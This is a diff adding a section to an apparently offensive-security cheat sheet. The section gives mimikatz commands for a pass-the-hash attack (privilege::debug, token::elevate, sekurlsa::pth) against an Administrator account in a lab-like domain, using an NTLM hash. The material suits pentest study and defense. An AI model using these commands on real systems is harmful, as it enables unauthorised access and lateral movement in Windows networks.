@@ -33,6 +33,20 @@ Crunch
  crunch 4 6 0123456789ABCDEF -o crunch.txt
 ```
 
+* **Using mimikatz:**
+  *   Execute Pass The Hash Attack with mimikatz.
+
+      Copy
+
+      ```powershell
+      mimikatz.exe
+      privilege::debug
+      token::elevate
+      privilege::debug
+      sekurlsa::pth /user:Administrator /domain:ignite.local /ntlm:32ed87bdb5fdc5e9cba88547376818d4
+      ```
+* Use the `sekurlsa::pth` command to pass the hash for privilege escalation.
+
 ### Common Network Service Attack Methods
 
 ### Table of Contents
